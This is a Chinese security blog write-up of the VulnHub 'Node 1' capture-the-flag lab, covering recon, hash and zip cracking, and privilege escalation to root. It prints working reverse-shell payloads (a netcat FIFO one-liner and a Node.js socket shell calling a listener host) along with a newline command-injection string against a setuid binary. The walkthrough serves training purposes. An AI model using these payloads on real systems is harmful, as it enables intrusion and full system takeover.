> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/LkC8XaPScQtltultdEAIPA)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **34** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/gBSJuVtWXPZE73MPxL1VoDjO3DFaxJA2MQpSSibwsXKVf4VIHh8S9fZXT8pq1ALE3hWEN22AaniaghxGrJqjEsxw/640?wx_fmt=png)

靶机地址：https://www.vulnhub.com/entry/node-1,252/

靶机难度：中级（CTF）

靶机发布日期：2018 年 8 月 7 日

靶机描述：

节点是中等级别的 boot2root 挑战，最初是为 HackTheBox 创建的。有两个标志（用户和根标志）和多种不同的技术可以使用。OVA 已在 VMware 和 Virtual Box 上进行了测试

目标：得到 root 权限 & 找到 flag.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/ymNhlIRQRwIDdqQDCiblECK9VN2KquqTzJXM7etEnDcIpDdITqzFuiapav9TDnIiaGgf1e4sP9IO6B5NEtEyg2t5w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/eGDabDaNAhQ72wHWRToOUZR31X9kamiak0wrpr3lxKHpuoTpia329Xu6T0OTYlZic9XeEyQ4twasnibb924VBgIt1g/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznnHibibThJNE8zpXlpVYVBU05LiblicYcicdWpJM97d4AUhg8VJR02ZrSKKw/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmzn0b300w5BtjiacRlaTMe8h0smWfEEbwmKf4ibbmBjmjZGWlUS5hLlN5RQ/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：192.168.56.130

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznuHO7bO7X6Ps5R85tia6icaFc1I8icllmyiaKx9VGX0LPqb1SaWw7GibPE9g/640?wx_fmt=png)

nmap 查看到 22 和 3000 端口已经开启...（又是 Node.js）前几章也有类似的

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznOc3WW0Dx6RDriaOIbTsdR4Y2lUZrJXGjJicXhbWlDoVZyXtxguZgWIQg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznEDZXiaDa0vpcOu1PuAPCGRj4q5X1FoTnoksl4pd3B9llBNF0IWB4WDg/640?wx_fmt=png)

使用默认密码无法登录...

还使用了 dirb，nikto 和 uniscan 去爆破，但是返回的地址都在主页上... 没啥别的有用信息...

回主页查看下前端源码看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmzno3QSqgxxlnAR8e0NBNTEsMelicTghYagNVVo7TmHcOvrIIG1AhMWpVA/640?wx_fmt=png)

该站点使用的 javascript 文件，并且使用了 angular.min.js 文件来搭建....

这边一个一个打开看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznaA3u4oGoRJLnD6HSOg9icUTiamIUP6CF68TzHPBvX74dNUFkUaicOvlqA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznMu2Ep1MsRAOaEO1Z82F2NwwL5lkYZAAS8MDazLDRBcVPFhMQu3FBSg/640?wx_fmt=png)

在 profile.js 和 home.js 文件中找到了几个 GET 请求...

这边可以用 burpsuit 或者 curl 查看底层链接情况...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznp9F0GvGUKWtrJezj0PggxYKbM4gmn1K7jpUiafnGc824P4U10SpWsdA/640?wx_fmt=png)

```
命令：curl IP+端口+目录...
```

可以看到 / api/users / 存在四个用户.../api/users/latest 存在三个用户....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmzn7ZribL2cFUp58AsW38xw54NmDmqWXrtz3gnTwYOywTWicwOiaicfbXZlbg/640?wx_fmt=png)

链接：

```
https://www.onlinehashcrack.com/hash-identification.php
https://crackstation.net/
http://finder.insidepro.team/
```

以上都可以进行哈希破解...

这边得到了四个用户名和密码...

myP14ceAdm1nAcc0uNT 和 manchester

tom 和 spongebob

mark 和 snowflake

rastating 没解析出来...

我们登陆看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznRHleZnvicF83XJOalq6nzMM7CBGNiaibtVOgEhlwK2V3FhklCG1FUGOoA/640?wx_fmt=png)

tom 和 mark 用户登陆都不是管理员界面，上图是用了 myP14ceAdm1nAcc0uNT 和 manchester 进行登陆，下载备份文件..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznksfW2Ria0e0ToWeUohZRjpF63ySw9v96CGZbWQfYU08hNFAl8ibhgvDA/640?wx_fmt=png)

文件下载下来发现是 base64 的文件...

我用 base64 -d 解码到文件夹打开发现是乱码....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmzn4icv9bAVgY7ufiae04pmZlX6GiavZvwed30nkMMcBWjCfViaqzpp2rfMBQ/640?wx_fmt=png)

原来是 zip 类型的文件...

```
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt dayu.zip
```

```
参数  描述
-D  指定方式为字典猜解
-p  指定猜解字典的路径
-u  表示只显示破解出来的密码，其他错误的密码不显示出
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznzX6IsazGprxO8QfOh8vR7NgMIwF4XS56S6dxztDLc6svy4jmpO8Rtw/640?wx_fmt=png)

解压密码破解出来了...

```
magicword
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznohOcuuSKYa0d8N3yEpuFaIfPUPwVq3XjP304xuZEUwAD2uGicj96Vibw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznuAFkar5ZUNSd7hoH4OtaNL8Z2bDRQ3mLAl3uMTJXU0I1y28gz4s5ag/640?wx_fmt=png)

熟悉 node.js 的同学应该会了解 app.js 的作用，它是程序启动文件，里面存储着重要配置信息，从该文件中，获取到 mongodb 的配置信息...

```
5AYRft73VtFpc84k
```

二、提权

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmzn9Jicfz1qstiash3ETEp0ZOVvK9dScfhmHeIP1ibficaomyLopSZfjKhG4g/640?wx_fmt=png)

成功登陆 mark 用户...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmzn3dkuuXpcfAz2JsvTsHaiaZjQWRSZOJrqlzGuuOxOVdIVSNE8YjrIm3w/640?wx_fmt=png)

```
cat /etc/*-release
```

linux 4.4.0 版本...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznPCwumR3nQTicR5GT1jafyuU6TYic1jL8x5ubwKHVVzdtPibY7WLI6JSYA/640?wx_fmt=png)

在漏洞库里搜索了下，发现就 44298 适合，别的 40871 我试了不成功...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmzn9RdWAYaEt4qpWN5I8lt0beMp0SQM3wkeiavSeXcZ8fOMJhiajibva9FKw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznBMiaWQeDOVXqJ7WPeicDcz28JQZhop2EsIB9pz31KiaGLF7MPJzSKnQWg/640?wx_fmt=png)

将 shell 上传到靶机上，然后 GCC 编译，执行提权即可...

还发现了另外一种提权的方法... 获得了 user 和 root 文本内容...

另外几种提权方法

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznrKCPMvI2icqMLTpEwvoXuViazW9iaHiceyH7lO2ko9O42PWtBekSmCpzxA/640?wx_fmt=png)

看到 / var/scheduler/app.js 的 tom 用户下运行的调度程序应用程序....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmzn3iaUQfTeWDsgRqmoibpvjwNav1ynkZL2WQe1Hszibhurx3zjPewHsqIog/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznQwrtfPQhz3CvVwQ8zZq7m9ViaFHsXRTM46PwbnBcOf7HdPd7zibStq3g/640?wx_fmt=png)

可以获得的信息...

可以链接到 Mongo 数据库....doc.cmd 每个带有字段 cmd 的文档上执行... 每 30 秒 setInterval 调用一次函数并执行...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznrIss7E0rz4WQic2bNoPjvRDKumfibRpD7LqBFwjiafUOSDTupTuOas87w/640?wx_fmt=png)

```
mongo -u mark -p 5AYRft73VtFpc84k scheduler
show collections
db.tasks.find({})
db.tasks.insert({cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.103 4444 >/tmp/f"})
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.103 4444 >/tmp/f
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznNzDHINSu5g7WRDraNgrLw4u6Za6TN93rlBHmsiava5ibKTicJxXT2hoMQ/640?wx_fmt=png)

使用 mark 的凭据访问 Mongo 数据库，插入一个新文档以在 “cmd” 字段中添加一个反向 shell 命令，本地开启 NC 监听，执行的命令和脚本

```
[参考](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
```

... 可以查看到第一个 user 的标志...  

当然这里还有别的方法在 JavaScript 中创建一个反向 shell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznDkFRcdNhmKI5dqKqW9fFiat0yI6Qj1AYmqgKR2wJFicGOlFiaH1vah7xg/640?wx_fmt=png)

```
1、mongo -u mark -p 5AYRft73VtFpc84k scheduler
2、show collections
3、db.tasks.findOne()
4、db.tasks.insert({"cmd": "/usr/bin/node /tmp/dayushell.js"})
shell：
 - (function(){
 var net = require("net"),
  cp = require("child_process"),
  sh = cp.spawn("/bin/sh", []);
 var client = new net.Socket();
 client.connect(1234, "192.168.56.103", function(){
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
 });
 return /a/; // Prevents the Node.js application form crashing
})();
```

在 / tmp / 目录写入一个 shell，然后就可以对 mongodb 通过 mark 凭据建立与凭证进行链接... 等待 30 秒即可获得权限...

继续下一步，查看下 tom 用户下的信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznRdiaVnicsXK7j60E3LibXNgbOMGe3t8akWahP13G5IiaMicczVXudibagdOw/640?wx_fmt=png)

在 / usr/local/bin 目录中发现 backup 二进制可执行文件... 看到管理组中的任何用户都可以执行二进制文件... 但在运行二进制文件时，它将以 root 特权运行... 前面可以看到我们 tom 用户在 admin 用户组中...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznAvyTIulrhmLJlibV4EiaAzZAEYMkCSLh9QhI32tJ1jGIb4u4v8xGxV3g/640?wx_fmt=png)

这边 app.js 的 key 是：

```
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
```

这边有两种方式提权，在 app.js 中或者 backup 中放入密匙即可...

开始

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznhJuB5ncxWPMn5UqryYhG8UPhgyutauaOwYDu4fib7qQYJSH3FbcPW9A/640?wx_fmt=png)

这边用：

```
/usr/local/bin/backup -q <backup_key> <directory>
```

来执行...  

目录这边可以用 / etc / 或者 / root/，使用这两个目录才会产生 base64 字符串...

该字符串可以按照与之前的 myplace.backup 文件完全相同的方式进行解码和解压缩....

我们直接 strings 查看下...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznZOR6YgvPrib6MwYoQO1v684vBLBJRmbJqia0wztUkUAaVVqJB1zpxbRw/640?wx_fmt=png)

可以从该命令的输出推断出，如果 directory 参数是 / root 或 / etc，则返回上面的硬编码 base64 长字符串，否则，二进制文件将运行

```
/usr/bin/zip -r -P magicword %s %s > /dev/null
```

由于脚本是加压缩文件... 我希望执行以下命令:

```
- /usr/bin/zip -r -P magicworld any_directory
/bin/bash
any_command > /dev/null
```

需要绕过 / dev/null 重定向......

现在要做的就是：

需要将字符串作为第三个参数传递给二进制可执行文件，该二进制可执行文件带有多个 \ n 字符，以打印新行，然后当 / bin/bash 执行时，我们将具有 root 访问权限，因为二进制文件以 root 身份运行，添加了最终命令，使 bash 会话的输出不会重定向到 / dev/null 即可...（不懂的多理解几遍...)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMEU5b9b8ialHRtmjOfCcmznrE01I4ibhjJsb8fIKJicMgS8jJqjISw36auGylNYRveLjRkb0dWLjyRA/640?wx_fmt=png)

```
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(echo '/any_directory\n/bin/bash\nany_command')"
```

注意：此命令在前面看到的 python 代码段创建的伪终端内不起作用的，必须首先通过在 psuedo-terminal 内键入 exit 或通过以用户 tom 身份重新连接而完全不运行 python 代码段来留下该伪终端，才可以执行成功！！

可以看到，成功利用 zip 插入了 shell 获得 root 权限...

这里我在将另外两种方法... 别嫌多，这是我累积这么多篇来的成果吧...

一种是在获得 mark 的账号 ssh 登录后用 linux/local/bpf_sign_extension_priv_esc 可以直接提权成为 root，这是利用了 CVE-2017-16995 这个漏洞去提权...

最后是缓冲区溢出...

```
gzip -c < /usr/local/bin/backup > /tmp/backup.gz
 base64 < /tmp/backup.gz
H4sIAL7Zq1kAA+ybe3Qb.......查看到的值...AAA
echo H4sIAL...AAA== > backup.gz.b64
base64 -d < backup.gz.b64 > backup.gz
gunzip -c < backup.gz > backup
```

![](https://mmbiz.qpic.cn/mmbiz_png/0eStkRlFeLpRNN1wgDtolVObh8qGRlETQMIDXGNKvKYjEKuuWO4hzPiafrslXhVGBwcTMG3Jg1s024bHuwVI6yA/640?wx_fmt=png)

用以上命令进行将 backup 考到 kali 或者本地计算机上使用 IDA 或者 gdb 进行分析... 有缓冲区溢出... 这里我没有继续进行尝试... 我留着以后回来挑战缓冲区溢出的方法...

由于我们已经成功得到 root 权限，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)